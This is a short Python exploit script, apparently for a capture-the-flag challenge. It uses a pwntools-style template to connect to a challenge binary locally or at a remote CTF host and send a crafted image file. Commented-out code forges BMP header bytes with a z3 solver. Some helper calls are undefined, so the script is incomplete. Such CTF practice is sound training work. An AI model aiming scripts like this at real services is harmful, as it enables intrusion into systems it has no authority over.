#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *
from z3 import *

exe = context.binary = ELF('./chal')

host = args.HOST or 'mc.ax'
port = int(args.PORT or 31547)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x4019c0
continue
'''.format(**locals())

# -- Exploit goes here --

def gen_BMP_header(size=0x1337):
    s = Solver()
    nums = [BitVec("num_%i" % i, 32) for i in range(4)]
    s.add(size == (nums[2] << 16) | nums[0] | (nums[1] << 8) | (nums[3] << 24))
    if s.check() == sat:
        n = []
        m = s.model()
        for i in nums:
            n.append(m[i].as_long())
        return(n)

io = start()
f=(open('PES.png', 'rb').read())
# f = b'BM\x8a\xc4\x00\x00\x00\x00' + f[8:]
# f = b'BM\x41\x42\x43\x44\x45\x46' + f[8:]
# header_bytes = gen_BMP_header(len(f))
# kek = ""
# for i in header_bytes:
#     print(chr(i))
#     kek += chr(i)
# f=f.decode('latin-1')
# f = 'BM\x00\xff' + kek + f[8:]
print(len(f))
re()
sl(str(len(f)))
re()
gdb.attach(io.pid)
sl(f)
io.interactive()

